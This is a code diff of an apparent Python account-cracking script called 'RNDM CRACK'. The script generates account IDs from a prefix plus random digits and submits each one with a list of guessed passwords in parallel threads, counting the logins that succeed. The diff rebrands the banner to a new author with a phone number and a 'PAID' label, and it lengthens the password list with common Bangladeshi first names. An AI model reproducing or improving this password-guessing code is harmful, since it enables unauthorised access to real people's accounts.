@@ -36,16 +36,21 @@ F='\033[38;5;45m'
 R='\033[38;5;196m'
 #--------------------- [ LOGO ] -------------------#
 fuck = """
-88""Yb 88  88  dP"Yb   dP"Yb  888888 
-88__dP 88  88 dP   Yb dP   Yb   88   
-88""Yb 888888 Yb   dP Yb   dP   88   
-88oodP 88  88  YbodP   YbodP    88   
-===================================
-[+] ADMIN : TANIM HOSSAIN
-[+] GITHUB: BHOOT-X
-[+] TOOL  : RNDM CRACK
-[+] STATES: OPEN SOURCE
-=================================== """
+\x1b[1;97m88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
+88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
+88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
+88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
+88 `88. 88   88 88      db   8D 88   88 88  V888 
+88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
+\x1b[1;97m===================================================
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 01305504954
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : PREMIUM
+\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : PAID
+\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.1
+===================================================="""
 #--------------------- [ DEF-LOGO X CLEAR ] -------------------#
 def x():
     os.system('clear')
@@ -85,7 +90,7 @@ def rndmx():
             print(f'[+] USE JAPAN APN COMING MORE OK IDS.......');xnxx()
             for psx in jan:
                 ids = dog+psx
-                passlist = [psx,ids,ids[:8],ids[:7],'bangla']
+                passlist = [psx,ids,ids[:8],ids[:7],'bangla','sadiya','sarmin','sabbir','jannat','hridoy','samiya','sumaiya','nusrat','fariya','saiful','mababa','fatema','ayesha','shohag','shagor','parbej','ashraful','asadul','mariya','nilima','rayhan','eshan','kawsar','nazmul',]
                 tanox.submit(sexx,ids,passlist)
     xnxx()
     print(f'[+] TOTAL OK -{str(len(oks))}')
